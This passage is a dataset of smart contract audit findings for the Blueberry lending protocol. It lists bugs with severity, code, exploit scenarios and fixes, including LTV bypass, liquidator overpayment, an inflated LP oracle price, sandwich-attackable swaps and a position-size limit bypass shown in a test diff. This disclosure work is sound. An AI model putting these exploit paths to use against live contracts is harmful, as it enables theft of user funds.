doRefund(collToken);\n    _validateMaxLTV(strategyId);\n}\n```\n\nHere is a quick proof of concept to explain the risk:\nLet's say a user deposits 1000 DAI as their underlying collateral.\nThey are using a risky strategy (let's call it strategy 911) which requires a maxLTV of 2X (ie maxLTV[911][DAI] = 2e5)\nThere is another safer strategy (let's call it strategy 411) which has a maxLTV of 5X (ie maxLTV[411][DAI] = 4e5)\nThe user takes the max loan from the risky strategy, borrowing $2000 USD of value.\nThey are not allowed to take any more loans from that strategy, or remove any of their collateral.\nThen, they call `reducePosition()`, withdrawing 1600 DAI and entering `411` as the strategyId.\nThe `_validateMaxLTV` check will happen on strategyId = `411`, and will pass, but the result will be that the user now has only 400 DAI of underlying collateral protecting $2000 USD worth of the risky strategy, violating the LTV.ч"Since the collateral a position holds will always be the vault token of the strategy they have used, you can validate the `strategyId` against the user's collateral, as follows:\n```\naddress positionCollToken = bank.positions(bank.POSITION_ID()).collToken;\naddress positionCollId = bank.positions(bank.POSITION_ID()).collId;\naddress unwrappedCollToken = IERC20Wrapper(positionCollToken).getUnderlyingToken(positionCollId);\nrequire(strategies[strategyId].vault == unwrappedCollToken, ""wrong strategy"");\n```\n"чUsers can get around the specific LTVs and create significantly higher leverage bets than the protocol has allowed. This could cause the protocol to get underwater, as the high leverage combined with risky assets could lead to dramatic price swings without adequate time for the liquidation mechanism to successfully protect solvency.\nCode Snippet\nTool used\nManual Review
Users can be liquidated prematurely because calculation understates value of underlying positionчhighч```\n((borrowsValue - collateralValue) / underlyingValue) >= underlyingLiqThreshold\n```\nчWhen the value of the underlying asset is calculated in `getPositionRisk()`, it uses the `underlyingAmount`, which is the amount of tokens initially deposited, without any adjustment for the interest earned. This can result in users being liquidated early, because the system undervalues their assets.\nA position is considered liquidatable if it meets the following criteria:\n```\n((borrowsValue - collateralValue) / underlyingValue) >= underlyingLiqThreshold\n```\n\nThe value of the underlying tokens is a major factor in this calculation. However, the calculation of the underlying value is performed with the following function call:\n```\nuint256 cv = oracle.getUnderlyingValue(\n    pos.underlyingToken,\n    pos.underlyingAmount\n);\n```\n\nIf we trace it back, we can see that `pos.underlyingAmount` is set when `lend()` is called (ie when underlying assets are deposited). This is the only place in the code where this value is moved upward, and it is only increased by the amount deposited. It is never moved up to account for the interest payments made on the deposit, which can materially change the value.чValue of the underlying assets should be derived from the vault shares and value, rather than being stored directly.чUsers can be liquidated prematurely because the value of their underlying assets are calculated incorrectly.\nCode Snippet\nTool used\nManual Review
Interest component of underlying amount is not withdrawable using the `withdrawLend` function. Such amount is permanently locked in the BlueBerryBank contractчhighч```\n    wAmount = wAmount > pos.underlyingAmount\n            ? pos.underlyingAmount\n            : wAmount;\n\n        pos.underlyingVaultShare -= shareAmount;\n        pos.underlyingAmount -= wAmount;\n        bank.totalLend -= wAmount;\n```\nчSoft vault shares are issued against interest bearing tokens issued by `Compound` protocol in exchange for underlying deposits. However, `withdrawLend` function caps the withdrawable amount to initial underlying deposited by user (pos.underlyingAmount). Capping underlying amount to initial underlying deposited would mean that a user can burn all his vault shares in `withdrawLend` function and only receive original underlying deposited.\nInterest accrued component received from Soft vault (that rightfully belongs to the user) is no longer retrievable because the underlying vault shares are already burnt. Loss to the users is permanent as such interest amount sits permanently locked in Blueberry bank.\n`withdrawLend` function in `BlueBerryBank` allows users to withdraw underlying amount from `Hard` or `Soft` vaults. `Soft` vault shares are backed by interest bearing `cTokens` issued by Compound Protocol\nUser can request underlying by specifying `shareAmount`. When user tries to send the maximum `shareAmount` to withdraw all the lent amount, notice that the amount withdrawable is limited to the `pos.underlyingAmount` (original deposit made by the user).\nWhile this is the case, notice also that the full `shareAmount` is deducted from `underlyingVaultShare`. User cannot recover remaining funds because in the next call, user doesn't have any vault shares against his address. Interest accrued component on the underlying that was returned by `SoftVault` to `BlueberryBank` never makes it back to the original lender.\n```\n    wAmount = wAmount > pos.underlyingAmount\n            ? pos.underlyingAmount\n            : wAmount;\n\n        pos.underlyingVaultShare -= shareAmount;\n        pos.underlyingAmount -= wAmount;\n        bank.totalLend -= wAmount;\n```\nчIntroduced a new variable to adjust positions & removed cap on withdraw amount.\nHighlighted changes I recommend to withdrawLend with //******//.\n```\nfunction withdrawLend(address token, uint256 shareAmount)\n        external\n        override\n        inExec\n        poke(token)\n    {\n        Position storage pos = positions[POSITION_ID];\n        Bank storage bank = banks[token];\n        if (token != pos.underlyingToken) revert INVALID_UTOKEN(token);\n        \n        //*********-audit cap shareAmount to maximum value, pos.underlyingVaultShare*******\n        if (shareAmount > pos.underlyingVaultShare) {\n            shareAmount = pos.underlyingVaultShare;\n        }\n\n        // if (shareAmount == type(uint256).max) {\n        //     shareAmount = pos.underlyingVaultShare;\n        // }        \n\n        uint256 wAmount;\n        uint256 amountToOffset; //*********- audit added this to adjust position********\n        if (address(ISoftVault(bank.softVault).uToken()) == token) {\n            ISoftVault(bank.softVault).approve(\n                bank.softVault,\n                type(uint256).max\n            );\n            wAmount = ISoftVault(bank.softVault).withdraw(shareAmount);\n        } else {\n            wAmount = IHardVault(bank.hardVault).withdraw(token, shareAmount);\n        }\n\n        //*********- audit calculate amountToOffset********\n        //*********-audit not capping wAmount anymore*******\n        amountToOffset = wAmount > pos.underlyingAmount\n            ? pos.underlyingAmount\n            : wAmount;\n\n        pos.underlyingVaultShare -= shareAmount;\n     //*********-audit subtract amountToOffset instead of wAmount*******\n        pos.underlyingAmount -= amountToOffset;\n        bank.totalLend -= amountToOffset;\n\n        wAmount = doCutWithdrawFee(token, wAmount);\n\n        IERC20Upgradeable(token).safeTransfer(msg.sender, wAmount);\n    }\n```\nчEvery time, user withdraws underlying from a Soft vault, interest component gets trapped in BlueBerry contract. Here is a scenario.\nAlice deposits 1000 USDC into `SoftVault` using the `lend` function of BlueberryBank at T=0\nUSDC soft vault mints 1000 shares to Blueberry bank\nUSDC soft vault deposits 1000 USDC into Compound & receives 1000 cUSDC\nAlice at T=60 days requests withdrawal against 1000 Soft vault shares\nSoft Vault burns 1000 soft vault shares and requests withdrawal from Compound against 1000 cTokens\nSoft vault receives 1050 USDC (50 USDC interest) and sends this to BlueberryBank\nBlueberry Bank caps the withdrawal amount to 1000 (original deposit)\nBlueberry Bank deducts 0.5% withdrawal fees and deposits 995 USDC back to user\nIn the whole process, Alice has lost access to 50 USDC.\nCode Snippet\nTool used\nManual Review
IchiLpOracle returns inflated price due to invalid calculationчmediumч```\nSTATICCALL IchiLpOracle.getPrice(token=0xFCFE742e19790Dd67a627875ef8b45F17DB1DaC6) => (1101189125194558706411110851447)\n```\nч`IchiLpOracle` returns inflated price due to invalid calculation\nIf you run the tests, then you can see that IchiLpOracle returns inflated price for the ICHI_USDC vault\n```\nSTATICCALL IchiLpOracle.getPrice(token=0xFCFE742e19790Dd67a627875ef8b45F17DB1DaC6) => (1101189125194558706411110851447)\n```\n\nAs the documentation says, the token price should be in USD with 18 decimals of precision. The price returned here is `1101189125194_558706411110851447` This is 1.1 trillion USD when considering the 18 decimals.\nThe test uses real values except for mocking ichi and usdc price, which are returned by the mock with correct decimals (1e18 and 1e6)чFix the LP token price calculation. The problem is that you multiply totalReserve with extra 1e18 (return (totalReserve * 1e18) / totalSupply;).\nDiscussion\nGornutz\nduplicate of 15ч`IchiLpOracle` price is used in `_validateMaxLTV` (collToken is the vault). Therefore the collateral value is inflated and users can open bigger positions than their collateral would normally allow.\nCode Snippet\n```\n/**\n * @notice Return lp token price in USD, with 18 decimals of precision.\n * @param token The underlying token address for which to get the price.\n * @return Price in USD\n */\nfunction getPrice(address token) external view override returns (uint256) {\n    IICHIVault vault = IICHIVault(token);\n    uint256 totalSupply = vault.totalSupply();\n    if (totalSupply == 0) return 0;\n\n    address token0 = vault.token0();\n    address token1 = vault.token1();\n\n    (uint256 r0, uint256 r1) = vault.getTotalAmounts();\n    uint256 px0 = base.getPrice(address(token0));\n    uint256 px1 = base.getPrice(address(token1));\n    uint256 t0Decimal = IERC20Metadata(token0).decimals();\n    uint256 t1Decimal = IERC20Metadata(token1).decimals();\n\n    uint256 totalReserve = (r0 * px0) /\n        10**t0Decimal +\n        (r1 * px1) /\n        10**t1Decimal;\n\n    return (totalReserve * 1e18) / totalSupply;\n}\n```\n\nlink\nTool used\nManual Review
totalLend isn't updated on liquidation, leading to permanently inflated valueчmediumч```\nbank.totalLend += amount;\n```\nч"`bank.totalLend` tracks the total amount that has been lent of a given token, but it does not account for tokens that are withdrawn when a position is liquidated. As a result, the value will become overstated, leading to inaccurate data on the pool.\nWhen a user lends a token to the Compound fork, the bank for that token increases its `totalLend` parameter:\n```\nbank.totalLend += amount;\n```\n\nSimilarly, this value is decreased when the amount is withdrawn.\nIn the event that a position is liquidated, the `underlyingAmount` and `underlyingVaultShare` for the user are decreased based on the amount that will be transferred to the liquidator.\n```\nuint256 liqSize = (pos.collateralSize * share) / oldShare;\nuint256 uTokenSize = (pos.underlyingAmount * share) / oldShare;\nuint256 uVaultShare = (pos.underlyingVaultShare * share) / oldShare;\n\npos.collateralSize -= liqSize;\npos.underlyingAmount -= uTokenSize;\npos.underlyingVaultShare -= uVaultShare;\n```\n\nHowever, the liquidator doesn't receive those shares ""inside the system"". Instead, they receive the softVault tokens that can be claimed directly for the underlying asset by calling `withdraw()`, which simply redeems the underlying tokens from the Compound fork and sends them to the user.\n```\nfunction withdraw(uint256 shareAmount)\n    external\n    override\n    nonReentrant\n    returns (uint256 withdrawAmount)\n{\n    if (shareAmount == 0) revert ZERO_AMOUNT();\n\n    _burn(msg.sender, shareAmount);\n\n    uint256 uBalanceBefore = uToken.balanceOf(address(this));\n    if (cToken.redeem(shareAmount) != 0) revert REDEEM_FAILED(shareAmount);\n    uint256 uBalanceAfter = uToken.balanceOf(address(this));\n\n    withdrawAmount = uBalanceAfter - uBalanceBefore;\n    // Cut withdraw fee if it is in withdrawVaultFee Window (2 months)\n    if (\n        block.timestamp <\n        config.withdrawVaultFeeWindowStartTime() +\n            config.withdrawVaultFeeWindow()\n    ) {\n        uint256 fee = (withdrawAmount * config.withdrawVaultFee()) /\n            DENOMINATOR;\n        uToken.safeTransfer(config.treasury(), fee);\n        withdrawAmount -= fee;\n    }\n    uToken.safeTransfer(msg.sender, withdrawAmount);\n\n    emit Withdrawn(msg.sender, withdrawAmount, shareAmount);\n}\n```\n\nNowhere in this process is `bank.totalLend` updated. As a result, each time there is a liquidation of size X, `bank.totalLend` will move X higher relative to the correct value. Slowly, over time, this value will begin to dramatically misrepresent the accurate amount that has been lent.\nWhile there is no material exploit based on this inaccuracy at the moment, this is a core piece of data in the protocol, and it's inaccuracy could lead to major issues down the road.\nFurthermore, it will impact immediate user behavior, as the Blueberry devs have explained ""we use that [value] to help us display TVL with subgraph"", which will deceive and confuse users."ч
Complete debt size is not paid off for fee on transfer tokens, but users aren't warnedчmediumч```\nfunction doERC20TransferIn(address token, uint256 amountCall)\n    internal\n    returns (uint256)\n{\n    uint256 balanceBefore = IERC20Upgradeable(token).balanceOf(\n        address(this)\n    );\n    IERC20Upgradeable(token).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amountCall\n    );\n    uint256 balanceAfter = IERC20Upgradeable(token).balanceOf(\n        address(this)\n    );\n    return balanceAfter - balanceBefore;\n}\n```\nчThe protocol seems to be intentionally catering to fee on transfer tokens by measuring token balances before and after transfers to determine the value received. However, the mechanism to pay the full debt will not succeed in paying off the debt if it is used with a fee on transfer token.\nThe protocol is clearly designed to ensure it is compatible with fee on transfer tokens. For example, all functions that receive tokens check the balance before and after, and calculate the difference between these values to measure tokens received:\n```\nfunction doERC20TransferIn(address token, uint256 amountCall)\n    internal\n    returns (uint256)\n{\n    uint256 balanceBefore = IERC20Upgradeable(token).balanceOf(\n        address(this)\n    );\n    IERC20Upgradeable(token).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amountCall\n    );\n    uint256 balanceAfter = IERC20Upgradeable(token).balanceOf(\n        address(this)\n    );\n    return balanceAfter - balanceBefore;\n}\n```\n\nThere is another feature of the protocol, which is that when loans are being repaid, the protocol gives the option of passing `type(uint256).max` to pay your debt in full:\n```\nif (amountCall == type(uint256).max) {\n    amountCall = oldDebt;\n}\n```\n\nHowever, these two features are not compatible. If a user paying off fee on transfer tokens passes in `type(uint256).max` to pay their debt in full, the full amount of their debt will be calculated. But when that amount is transferred to the contract, the amount that the result increases will be slightly less. As a result, the user will retain some balance that is not paid off.ч"I understand that it would be difficult to implement a mechanism to pay fee on transfer tokens off in full. That adds a lot of complexity that is somewhat fragile.\nThe issue here is that the failure is silent, so that users request to pay off their loan in full, get confirmation, and may not realize that the loan still has an outstanding balance with interest accruing.\nTo solve this, there should be a confirmation that any user who passes `type(uint256).max` has paid off their debt in full. Otherwise, the function should revert, so that users paying fee on transfer tokens know that they cannot use the ""pay in full"" feature and must specify the correct amount to get their outstanding balance down to zero."чThe feature to allow loans to be paid in full will silently fail when used with fee on transfer tokens, which may trick users into thinking they have completely paid off their loans, and accidentally maintaining a balance.\nCode Snippet\nTool used\nManual Review
HardVault never deposits assets to Compoundчmediumч```\n/**\n    * @notice Deposit underlying assets on Compound and issue share token\n    * @param amount Underlying token amount to deposit\n    * @return shareAmount cToken amount\n    */\nfunction deposit(address token, uint256 amount) { // rest of code }\n\n/**\n    * @notice Withdraw underlying assets from Compound\n    * @param shareAmount Amount of cTokens to redeem\n    * @return withdrawAmount Amount of underlying assets withdrawn\n    */\nfunction withdraw(address token, uint256 shareAmount) { // rest of code }\n```\nч```\n/**\n    * @notice Deposit underlying assets on Compound and issue share token\n    * @param amount Underlying token amount to deposit\n    * @return shareAmount cToken amount\n    */\nfunction deposit(address token, uint256 amount) { // rest of code }\n\n/**\n    * @notice Withdraw underlying assets from Compound\n    * @param shareAmount Amount of cTokens to redeem\n    * @return withdrawAmount Amount of underlying assets withdrawn\n    */\nfunction withdraw(address token, uint256 shareAmount) { // rest of code }\n```\n\nHowever, if we examine the code in these functions, there is no movement of the assets to Compound. Instead, they sit in the Hard Vault and doesn't earn any yield.чEither add the functionality to the Hard Vault to have the assets pulled from the ERC1155 and deposited to the Compound fork, or change the comments and docs to be clear that such underlying assets will not be receiving any yield.чUsers who may expect to be earning yield on their underlying tokens will not be.\nCode Snippet\nTool used\nManual Review
Withdrawals from IchiVaultSpell have no slippage protection so can be frontrun, stealing all user fundsчmediumч```\nif (amountToSwap > 0) {\n    swapPool = IUniswapV3Pool(vault.pool());\n    swapPool.swap(\n        address(this),\n        !isTokenA,\n        int256(amountToSwap),\n        isTokenA\n            ? UniV3WrappedLibMockup.MAX_SQRT_RATIO - 1 \n            : UniV3WrappedLibMockup.MIN_SQRT_RATIO + 1, \n        abi.encode(address(this))\n    );\n}\n```\nч"When a user withdraws their position through the `IchiVaultSpell`, part of the unwinding process is to trade one of the released tokens for the other, so the borrow can be returned. This trade is done on Uniswap V3. The parameters are set in such a way that there is no slippage protection, so any MEV bot could see this transaction, aggressively sandwich attack it, and steal the majority of the user's funds.\nUsers who have used the `IchiVaultSpell` to take positions in Ichi will eventually choose to withdraw their funds. They can do this by calling `closePosition()` or `closePositionFarm()`, both of which call to `withdrawInternal()`, which follows loosely the following logic:\nsends the LP tokens back to the Ichi vault for the two underlying tokens (one of which was what was borrowed)\nswaps the non-borrowed token for the borrowed token on UniV3, to ensure we will be able to pay the loan back\nwithdraw our underlying token from the Compound fork\nrepay the borrow token loan to the Compound fork\nvalidate that we are still under the maxLTV for our strategy\nsend the funds (borrow token and underlying token) back to the user\nThe issue exists in the swap, where Uniswap is called with the following function:\n```\nif (amountToSwap > 0) {\n    swapPool = IUniswapV3Pool(vault.pool());\n    swapPool.swap(\n        address(this),\n        !isTokenA,\n        int256(amountToSwap),\n        isTokenA\n            ? UniV3WrappedLibMockup.MAX_SQRT_RATIO - 1 \n            : UniV3WrappedLibMockup.MIN_SQRT_RATIO + 1, \n        abi.encode(address(this))\n    );\n}\n```\n\nThe 4th variable is called `sqrtPriceLimitX96` and it represents the square root of the lowest or highest price that you are willing to perform the trade at. In this case, we've hardcoded in that we are willing to take the worst possible rate (highest price in the event we are trading 1 => 0; lowest price in the event we are trading 0 => 1).\n```\nfunction uniswapV3SwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data\n) external override {\n    if (msg.sender != address(swapPool)) revert NOT_FROM_UNIV3(msg.sender);\n    address payer = abi.decode(data, (address));\n\n    if (amount0Delta > 0) {\n        if (payer == address(this)) {\n            IERC20Upgradeable(swapPool.token0()).safeTransfer(\n                msg.sender,\n                uint256(amount0Delta)\n            );\n        } else {\n            IERC20Upgradeable(swapPool.token0()).safeTransferFrom(\n                payer,\n                msg.sender,\n                uint256(amount0Delta)\n            );\n        }\n    } else if (amount1Delta > 0) {\n        if (payer == address(this)) {\n            IERC20Upgradeable(swapPool.token1()).safeTransfer(\n                msg.sender,\n                uint256(amount1Delta)\n            );\n        } else {\n            IERC20Upgradeable(swapPool.token1()).safeTransferFrom(\n                payer,\n                msg.sender,\n                uint256(amount1Delta)\n            );\n        }\n    }\n}\n```\n\nWhile it is true that there is an `amountRepay` parameter that is inputted by the user, it is not sufficient to protect users. Many users will want to make only a small repayment (or no repayment) while unwinding their position, and thus this variable will only act as slippage protection in the cases where users intend to repay all of their returned funds.\nWith this knowledge, a malicious MEV bot could watch for these transactions in the mempool. When it sees such a transaction, it could perform a ""sandwich attack"", trading massively in the same direction as the trade in advance of it to push the price out of whack, and then trading back after us, so that they end up pocketing a profit at our expense.\nBecause many of the ICHI token pairs have small amounts of liquidity (for example, ICHI-WBTC has under $350k), such an attack could feasible take the majority of the funds, leaving the user with close to nothing. See more details on liquidity here: https://info.uniswap.org/#/tokens/0x111111517e4929d3dcbdfa7cce55d30d4b6bc4d6"чHave the user input a slippage parameter to ensure that the amount of borrowed token they receive back from Uniswap is in line with what they expect.\nAlternatively, use the existing oracle system to estimate a fair price and use that value in the `swap()` call.чUsers withdrawing their funds through the `IchiVaultSpell` who do not plan to repay all of the tokens returned from Uniswap could be sandwich attacked, losing their funds by receiving very little of their borrowed token back from the swap.\nCode Snippet\nTool used\nManual Review
BasicSpell.doCutRewardsFee uses depositFee instead of withdraw feeчmediumч```\n    function doCutRewardsFee(address token) internal {\n        if (bank.config().treasury() == address(0)) revert NO_TREASURY_SET();\n\n\n        uint256 balance = IERC20Upgradeable(token).balanceOf(address(this));\n        if (balance > 0) {\n            uint256 fee = (balance * bank.config().depositFee()) / DENOMINATOR;\n            IERC20Upgradeable(token).safeTransfer(\n                bank.config().treasury(),\n                fee\n            );\n\n\n            balance -= fee;\n            IERC20Upgradeable(token).safeTransfer(bank.EXECUTOR(), balance);\n        }\n    }\n```\nчBasicSpell.doCutRewardsFee uses depositFee instead of withdraw fee\n```\n    function doCutRewardsFee(address token) internal {\n        if (bank.config().treasury() == address(0)) revert NO_TREASURY_SET();\n\n\n        uint256 balance = IERC20Upgradeable(token).balanceOf(address(this));\n        if (balance > 0) {\n            uint256 fee = (balance * bank.config().depositFee()) / DENOMINATOR;\n            IERC20Upgradeable(token).safeTransfer(\n                bank.config().treasury(),\n                fee\n            );\n\n\n            balance -= fee;\n            IERC20Upgradeable(token).safeTransfer(bank.EXECUTOR(), balance);\n        }\n    }\n```\n\nThis function is called in order to get fee from ICHI rewards, collected by farming. But currently it takes `bank.config().depositFee()` instead of `bank.config().withdrawFee()`.ч
Liquidator can take all collateral and underlying tokens for a fraction of the correct priceчhighч```\nuint256 oldShare = pos.debtShareOf[debtToken];\n(uint256 amountPaid, uint256 share) = repayInternal(\n    positionId,\n    debtToken,\n    amountCall\n);\n\nuint256 liqSize = (pos.collateralSize * share) / oldShare;\nuint256 uTokenSize = (pos.underlyingAmount * share) / oldShare;\nuint256 uVaultShare = (pos.underlyingVaultShare * share) / oldShare;\n\npos.collateralSize -= liqSize;\npos.underlyingAmount -= uTokenSize;\npos.underlyingVaultShare -= uVaultShare;\n\n// // rest of codetransfer liqSize wrapped LP Tokens and uVaultShare underlying vault shares to the liquidator\n}\n```\nчWhen performing liquidation calculations, we use the proportion of the individual token's debt they pay off to calculate the proportion of the liquidated user's collateral and underlying tokens to send to them. In the event that the user has multiple types of debt, the liquidator will be dramatically overpaid.\nWhen a position's risk rating falls below the underlying token's liquidation threshold, the position becomes liquidatable. At this point, anyone can call `liquidate()` and pay back a share of their debt, and receive a propotionate share of their underlying assets.\nThis is calculated as follows:\n```\nuint256 oldShare = pos.debtShareOf[debtToken];\n(uint256 amountPaid, uint256 share) = repayInternal(\n    positionId,\n    debtToken,\n    amountCall\n);\n\nuint256 liqSize = (pos.collateralSize * share) / oldShare;\nuint256 uTokenSize = (pos.underlyingAmount * share) / oldShare;\nuint256 uVaultShare = (pos.underlyingVaultShare * share) / oldShare;\n\npos.collateralSize -= liqSize;\npos.underlyingAmount -= uTokenSize;\npos.underlyingVaultShare -= uVaultShare;\n\n// // rest of codetransfer liqSize wrapped LP Tokens and uVaultShare underlying vault shares to the liquidator\n}\n```\n\nTo summarize:\nThe liquidator inputs a debtToken to pay off and an amount to pay\nWe check the amount of debt shares the position has on that debtToken\nWe call `repayInternal()`, which pays off the position and returns the amount paid and number of shares paid off\nWe then calculate the proportion of collateral and underlying tokens to give the liquidator\nWe adjust the liquidated position's balances, and send the funds to the liquidator\nThe problem comes in the calculations. The amount paid to the liquidator is calculated as:\n```\nuint256 liqSize = (pos.collateralSize * share) / oldShare\nuint256 uTokenSize = (pos.underlyingAmount * share) / oldShare;\nuint256 uVaultShare = (pos.underlyingVaultShare * share) / oldShare;\n```\n\nThese calculations are taking the total size of the collateral or underlying token. They are then multiplying it by `share / oldShare`. But `share / oldShare` is just the proportion of that one type of debt that was paid off, not of the user's entire debt pool.\nLet's walk through a specific scenario of how this might be exploited:\nUser deposits 1mm DAI (underlying) and uses it to borrow $950k of ETH and $50k worth of ICHI (11.8k ICHI)\nBoth assets are deposited into the ETH-ICHI pool, yielding the same collateral token\nBoth prices crash down by 25% so the position is now liquidatable (worth $750k)\nA liquidator pays back the full ICHI position, and the calculations above yield `pos.collateralSize * 11.8k / 11.8k` (same calculation for the other two formulas)\nThe result is that for 11.8k ICHI (worth $37.5k after the price crash), the liquidator got all the DAI (value $1mm) and LP tokens (value $750k)чAdjust these calculations to use `amountPaid / getDebtValue(positionId)`, which is accurately calculate the proportion of the total debt paid off.чIf a position with multiple borrows goes into liquidation, the liquidator can pay off the smallest token (guaranteed to be less than half the total value) to take the full position, stealing funds from innocent users.\nCode Snippet\nTool used\nManual Review
The maximum size of an `ICHI` vault spell position can be arbitrarily surpassedчmediumч"```\ndiff --git a/test/spell/ichivault.spell.test.ts b/test/spell/ichivault.spell.test.ts\nindex 258d653..551a6eb 100644\n--- a/test/spell/ichivault.spell.test.ts\n// Add the line below\n// Add the line below\n// Add the line below\n b/test/spell/ichivault.spell.test.ts\n@@ -163,6 // Add the line below\n163,26 @@ describe('ICHI Angel Vaults Spell', () => {\n                                afterTreasuryBalance.sub(beforeTreasuryBalance)\n                        ).to.be.equal(depositAmount.mul(50).div(10000))\n                })\n// Add the line below\n               it(""should revert when exceeds max pos size due to increasing position"", async () => {\n// Add the line below\n                       await ichi.approve(bank.address, ethers.constants.MaxUint256);\n// Add the line below\n                       await bank.execute(\n// Add the line below\n                               0,\n// Add the line below\n                               spell.address,\n// Add the line below\n                               iface.encodeFunctionData(""openPosition"", [\n// Add the line below\n                                       0, ICHI, USDC, depositAmount.mul(4), borrowAmount.mul(6) // Borrow 1.800e6 USDC\n// Add the line below\n                               ])\n// Add the line below\n                       );\n// Add the line below\n\n// Add the line below\n                       await expect(\n// Add the line below\n                               bank.execute(\n// Add the line below\n                                       0,\n// Add the line below\n                                       spell.address,\n// Add the line below\n                                       iface.encodeFunctionData(""openPosition"", [\n// Add the line below\n                                               0, ICHI, USDC, depositAmount.mul(1), borrowAmount.mul(2) // Borrow 300e6 USDC\n// Add the line below\n                                       ])\n// Add the line below\n                               )\n// Add the line below\n                       ).to.be.revertedWith(""EXCEED_MAX_POS_SIZE""); // 1_800e6 // Add the line below\n 300e6 = 2_100e6 > 2_000e6 strategy max position size limit\n// Add the line below\n               })\n                it(""should be able to return position risk ratio"", async () => {\n                        let risk = await bank.getPositionRisk(1);\n                        console.log('Prev Position Risk', utils.formatUnits(risk, 2), '%');\n```\n"ч"The maximum size of an `ICHI` vault spell position can be arbitrarily surpassed by subsequent deposits to a position due to a flaw in the `curPosSize` calculation.\nIchi vault spell positions are subject to a maximum size limit to prevent large positions, ensuring a wide margin for liquidators and bad debt prevention for the protocol.\nThe maximum position size is enforced in the `IchiVaultSpell.depositInternal` function and compared to the current position size `curPosSize`.\nHowever, the `curPosSize` does not reflect the actual position size, but the amount of Ichi vault LP tokens that are currently held in the `IchiVaultSpell` contract (see L153).\nAssets can be repeatedly deposited into an Ichi vault spell position using the `IchiVaultSpell.openPosition` function (via the `BlueBerryBank.execute` function).\nOn the very first deposit, the `curPosSize` correctly reflects the position size. However, on subsequent deposits, the previously received Ichi `vault` LP tokens are kept in the `BlueBerryBank` contract. Thus, checking the balance of `vault` tokens in the `IchiVaultSpell` contract only accounts for the current deposit.\nTest case\nTo demonstrate this issue, please use the following test case:\n```\ndiff --git a/test/spell/ichivault.spell.test.ts b/test/spell/ichivault.spell.test.ts\nindex 258d653..551a6eb 100644\n--- a/test/spell/ichivault.spell.test.ts\n// Add the line below\n// Add the line below\n// Add the line below\n b/test/spell/ichivault.spell.test.ts\n@@ -163,6 // Add the line below\n163,26 @@ describe('ICHI Angel Vaults Spell', () => {\n                                afterTreasuryBalance.sub(beforeTreasuryBalance)\n                        ).to.be.equal(depositAmount.mul(50).div(10000))\n                })\n// Add the line below\n               it(""should revert when exceeds max pos size due to increasing position"", async () => {\n// Add the line below\n                       await ichi.approve(bank.address, ethers.constants.MaxUint256);\n// Add the line below\n                       await bank.execute(\n// Add the line below\n                               0,\n// Add the line below\n                               spell.address,\n// Add the line below\n                               iface.encodeFunctionData(""openPosition"", [\n// Add the line below\n                                       0, ICHI, USDC, depositAmount.mul(4), borrowAmount.mul(6) // Borrow 1.800e6 USDC\n// Add the line below\n                               ])\n// Add the line below\n                       );\n// Add the line below\n\n// Add the line below\n                       await expect(\n// Add the line below\n                               bank.execute(\n// Add the line below\n                                       0,\n// Add the line below\n                                       spell.address,\n// Add the line below\n                                       iface.encodeFunctionData(""openPosition"", [\n// Add the line below\n                                               0, ICHI, USDC, depositAmount.mul(1), borrowAmount.mul(2) // Borrow 300e6 USDC\n// Add the line below\n                                       ])\n// Add the line below\n                               )\n// Add the line below\n                       ).to.be.revertedWith(""EXCEED_MAX_POS_SIZE""); // 1_800e6 // Add the line below\n 300e6 = 2_100e6 > 2_000e6 strategy max position size limit\n// Add the line below\n               })\n                it(""should be able to return position risk ratio"", async () => {\n                        let risk = await bank.getPositionRisk(1);\n                        console.log('Prev Position Risk', utils.formatUnits(risk, 2), '%');\n```\n\nRun the test with the following command:\n```\nyarn hardhat test --grep ""should revert when exceeds max pos size due to increasing position""\n```\n\nThe test case fails and therefore shows that the maximum position size can be exceeded without reverting."чConsider determining the current position size using the `bank.getPositionValue()` function instead of using the current Ichi vault LP token balance.чThe maximum position size limit can be exceeded, leading to potential issues with liquidations and bad debt accumulation.\nCode Snippet\n```\nfunction depositInternal(\n    uint256 strategyId,\n    address collToken,\n    address borrowToken,\n    uint256 collAmount,\n    uint256 borrowAmount\n) internal {\n// rest of code      // [// rest of code]\n    // 4. Validate MAX LTV\n    _validateMaxLTV(strategyId);\n    // 5. Validate Max Pos Size\n    uint256 lpPrice = bank.oracle().getPrice(strategy.vault);\n    uint256 curPosSize = (lpPrice * vault.balanceOf(address(this))) /\n        10**IICHIVault(strategy.vault).decimals();\n    if (curPosSize > strategy.maxPositionSize)\n        revert EXCEED_MAX_POS_SIZE(strategyId);\n}\n```\n\nTool used\nManual Review
LP tokens cannot be valued because ICHI cannot be priced by oracle, causing all new open positions to revertчmediumч```\nfunction getPrice(address token) external view override returns (uint256) {\n    IICHIVault vault = IICHIVault(token);\n    uint256 totalSupply = vault.totalSupply();\n    if (totalSupply == 0) return 0;\n\n    address token0 = vault.token0();\n    address token1 = vault.token1();\n\n    (uint256 r0, uint256 r1) = vault.getTotalAmounts();\n    uint256 px0 = base.getPrice(address(token0));\n    uint256 px1 = base.getPrice(address(token1));\n    uint256 t0Decimal = IERC20Metadata(token0).decimals();\n    uint256 t1Decimal = IERC20Metadata(token1).decimals();\n\n    uint256 totalReserve = (r0 * px0) /\n        10**t0Decimal +\n        (r1 * px1) /\n        10**t1Decimal;\n\n    return (totalReserve * 1e18) / totalSupply;\n}\n```\nч"In order to value ICHI LP tokens, the oracle uses the Fair LP Pricing technique, which uses the prices of both individual tokens, along with the quantities, to calculate the LP token value. However, this process requires the underlying token prices to be accessible by the oracle. Both Chainlink and Band do not support the ICHI token, so the function will fail, causing all new positions using the IchiVaultSpell to revert.\nWhen a new Ichi position is opened, the ICHI LP tokens are posted as collateral. Their value is assessed using the `IchiLpOracle#getPrice()` function:\n```\nfunction getPrice(address token) external view override returns (uint256) {\n    IICHIVault vault = IICHIVault(token);\n    uint256 totalSupply = vault.totalSupply();\n    if (totalSupply == 0) return 0;\n\n    address token0 = vault.token0();\n    address token1 = vault.token1();\n\n    (uint256 r0, uint256 r1) = vault.getTotalAmounts();\n    uint256 px0 = base.getPrice(address(token0));\n    uint256 px1 = base.getPrice(address(token1));\n    uint256 t0Decimal = IERC20Metadata(token0).decimals();\n    uint256 t1Decimal = IERC20Metadata(token1).decimals();\n\n    uint256 totalReserve = (r0 * px0) /\n        10**t0Decimal +\n        (r1 * px1) /\n        10**t1Decimal;\n\n    return (totalReserve * 1e18) / totalSupply;\n}\n```\n\nThis function uses the ""Fair LP Pricing"" formula, made famous by 